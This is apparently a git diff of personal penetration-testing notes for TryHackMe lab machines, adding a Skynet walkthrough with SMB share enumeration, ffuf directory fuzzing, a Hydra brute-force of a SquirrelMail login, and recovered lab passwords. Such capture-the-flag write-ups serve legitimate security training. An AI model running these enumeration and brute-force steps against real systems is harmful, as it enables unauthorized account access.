@@ -1,6 +1,6 @@
 # Penetration Test THM Pathway
 ![hacker](oscp.png)
-Following notes I took facing some challange\box, so these are not properly write-up\walkthrough, often just an aspect is covered (e.g. privilege escalation). I took the notes since I discovered new tactics (sometime reading someone else blog or article), that I was not able to discover (or to think)
+Following notes I took facing some challange\box, so these are not properly write-up\walkthrough, often just an aspect is covered (e.g. privilege escalation). I took the notes since I discovered new tactics, sometime reading someone else blog or article, or just because I liked the exploitation path.
 
 ## Vulnversity
 ### Priv escalation
@@ -229,5 +229,89 @@ Get the flag
     agent47@gamezone:~$ cat /usr/share/webmin/file/flag.txt
       a4b945830144bdd71908d12d902adeee
 
+## Skynet
+Map smb share
 
+    smbmap -H 10.10.18.58
+    ...  
+                                                                                                    
+    [+] IP: 10.10.18.58:445 Name: 10.10.18.58               Status: Authenticated
+            Disk                                                    Permissions     Comment
+            ----                                                    -----------     -------
+            print$                                                  NO ACCESS       Printer Drivers
+            anonymous                                               READ ONLY       Skynet Anonymous Share
+            milesdyson                                              NO ACCESS       Miles Dyson Personal Share
+            IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
+
+We can access the anonymous share only:
+
+    smbclient \\\\10.10.18.58\\anonymous 
+    Password for [WORKGROUP\zinz]:
+    Try "help" to get a list of possible commands.
+    smb: \> ls
+      .                                   D        0  Thu Nov 26 17:04:00 2020
+      ..                                  D        0  Tue Sep 17 09:20:17 2019
+      attention.txt                       N      163  Wed Sep 18 05:04:59 2019
+      logs                                D        0  Wed Sep 18 06:42:16 2019
+
+                9204224 blocks of size 1024. 5831512 blocks available
+    smb: \> get attention.txt 
+    getting file \attention.txt of size 163 as attention.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+    smb: \> cd logs\
+    smb: \logs\> ls
+      .                                   D        0  Wed Sep 18 06:42:16 2019
+      ..                                  D        0  Thu Nov 26 17:04:00 2020
+      log2.txt                            N        0  Wed Sep 18 06:42:13 2019
+      log1.txt                            N      471  Wed Sep 18 06:41:59 2019
+      log3.txt                            N        0  Wed Sep 18 06:42:16 2019
+    
+                    9204224 blocks of size 1024. 5831512 blocks available
+    
+    smb: \logs\> get log1.txt 
+    getting file \logs\log1.txt of size 471 as log1.txt (1.2 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+
+Search hidden folder on the web server
+
+    ffuf -u http://10.10.18.58/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c
+
+    
+       v2.1.0-dev
+    ________________________________________________
+    
+     :: Method           : GET
+     :: URL              : http://10.10.18.58/FUZZ
+     :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+     :: Follow redirects : false
+     :: Calibration      : false
+     :: Timeout          : 10
+     :: Threads          : 40
+     :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+    ________________________________________________
+
+    ...
+    admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 70ms]
+    css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 75ms]
+    js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 72ms]
+    config                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 67ms]
+    ai                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 67ms]
+    squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 82ms]
+                            [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 67ms]
+    server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 67ms]
+    :: Progress: [220560/220560] :: Job [1/1] :: 422 req/sec :: Duration: [0:06:50] :: Errors: 0 ::
+
+Visiting /squirrelmail we are redirected to login: /squirrelmail/src/login.php, Proceed to brute-force the login using the password list found it on the anonymous share. I created a possible combination of usernames for Miles Dyson:
+
+    cat miles.txt          
+      Miles.Dyson
+      Miles-Dyson
+      Miles_Dyson
+      MilesDyson
+
+Then I proceeded with Hydra:
+
+    hydra -L miles.txt -P log1.txt 10.10.18.58 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:password incorrect"
+    ...
+    [80][http-post-form] host: 10.10.18.58   login: MilesDyson   password: cyborg007haloterminator
+
+Inspecting the recived email we found the samba password: )s{A&2Z=F^n_E.B`
     
